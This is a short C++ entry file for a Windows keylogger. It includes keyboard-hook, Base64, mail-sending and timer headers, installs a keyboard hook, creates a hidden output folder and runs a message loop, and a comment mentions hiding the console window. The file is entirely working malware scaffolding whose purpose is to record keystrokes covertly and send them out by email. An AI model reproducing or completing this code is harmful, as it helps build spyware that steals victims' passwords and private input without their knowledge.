#include <iostream>
#include <windows.h>
#include "KeyConstants.h"
#include "Helper.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"
#include "KeybHook.h"

using namespace std;

int main(){
    // Settings -> Compiler: Have compiler follow ISO C++ 11 standard and create a WindowsAPI flag
    MSG Msg;
    IO::MKDir(IO::GetOurPath(true));

    InstallHook();
    // solve the console problem (Dirty way of hiding the console window)
    while(GetMessageA(&Msg, NULL, 0, 0)){
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }

    MailTimer.Stop();
    return 0;
}
